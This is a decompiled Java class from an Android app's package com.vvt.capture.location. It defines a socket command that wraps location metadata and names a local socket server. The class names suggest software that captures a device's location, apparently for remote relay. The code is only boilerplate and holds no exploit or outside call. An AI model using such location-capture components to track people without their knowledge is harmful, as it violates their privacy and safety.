package com.vvt.capture.location.ref.command;

import com.fx.socket.SocketCmd;

public class RemoteLocationEvent extends SocketCmd {
  private static final long serialVersionUID = -4924766994872831800L;
  
  public RemoteLocationEvent(RemoteLocationMetadata paramRemoteLocationMetadata) {
    super(paramRemoteLocationMetadata, Boolean.class);
  }
  
  protected String getServerName()
  {
    return "com.fx.socket.loc.client";
  }
  
  protected String getTag()
  {
    return "RemoteLocationEvent";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/location/ref/command/RemoteLocationEvent.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */